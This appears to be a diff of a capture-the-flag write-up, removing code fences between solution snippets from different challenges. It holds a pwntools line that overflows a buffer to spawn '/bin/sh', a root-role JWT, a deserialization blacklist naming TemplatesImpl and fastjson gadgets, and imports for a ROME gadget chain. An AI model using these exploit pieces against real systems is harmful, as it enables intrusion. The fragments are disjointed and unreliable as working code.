@@ -344,7 +344,7 @@ public class Jsrc {
 }
 
 public class ByteCompare {
-  private static final ArrayList<byte[]> blacklist = (ArrayList)new ArrayList<>();
+  private static final ArrayList blacklist = (ArrayList)new ArrayList<>();
   
   String[] s = new String[] { "java.util.HashMap", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.alibaba.fastjson.JSONArrayLlist" };
   
@@ -463,11 +463,6 @@ def dfs(x, y, path, depth):
             dfs(nx, ny, path + [c], depth + 1)
 
 dfs(1, 1, [], 0)
-```
-
-
-
-```
 from pwn import *
 
 def rep(s):
@@ -522,11 +517,6 @@ p.sendline(sc)
 sleep(1)
 p.sendline(cyclic(999).replace(b'aaaabaaa', p64(0x404dd0)).replace(b'eaaafaaa', b'/bin/shx00'))
 p.interactive()
-```
-
-
-
-```
 // 加密函数，你需要替换成实际的加密函数
 function enc(input) {
     return atob(window["😘😘❤️😘😘"](input))
@@ -565,14 +555,9 @@ function bruteForce(target) {
     return known; // 返回爆破得到的字符串
 }
 bruteForce(target);
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <Windows.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <Windows.h>
 
 int main() {
     char enc[] = {170, 171, 238, 146, 108, 213, 219, 252, 124, 214, 109, 121, 137, 14, 215, 200, 6, 43, 199, 235, 37, 127, 36, 26, 26, 8, 64, 90, 135, 71, 236, 42, 30, 3, 226, 241, 42, 141, 217, 58, 190, 54, 192, 21, 61, 74, 144, 7, 0};
@@ -630,11 +615,6 @@ int main() {
     printf("flag{%45s}n", enc);
 
 }
-```
-
-
-
-```
 import binascii, base64
 from Crypto.Util.number import long_to_bytes, bytes_to_long
 from hashlib import sha256
@@ -712,17 +692,7 @@ for i in range(n):
 print(x)
 
 # 39313219724394204510065149548180909443668279642741674773372964155008434357587
-```
-
-
-
-```
 authToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyIiwic3ViIjoiMiIsImlhdCI6MTcxNjY5NTM5OSwicm9sZXMiOiJyb290IiwiZXhwIjoxNzE2Njk4OTk5fQ.w8JBgfsiVEBluG9pyNjc1_uTcnJNUVxylUoeFbuob1g
-```
-
-
-
-```
 @RestController
 public class Jsrc {
   @PostMapping({"/Jsrc"})
@@ -742,13 +712,8 @@ public class Jsrc {
     return "oh, yeah!";
   }
 }
-```
-
-
-
-```
 public class ByteCompare {
-  private static final ArrayList<byte[]> blacklist = (ArrayList)new ArrayList<>();
+  private static final ArrayList blacklist = (ArrayList)new ArrayList<>();
   
   String[] s = new String[] { "java.util.HashMap", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.alibaba.fastjson.JSONArrayLlist" };
   
@@ -774,11 +739,6 @@ public class ByteCompare {
     } 
   }
 }
-```
-
-
-
-```
 import com.sun.syndication.feed.impl.EqualsBean;
 import util.CustomObjectOutputStream;
 import util.createTemplatesImpl;
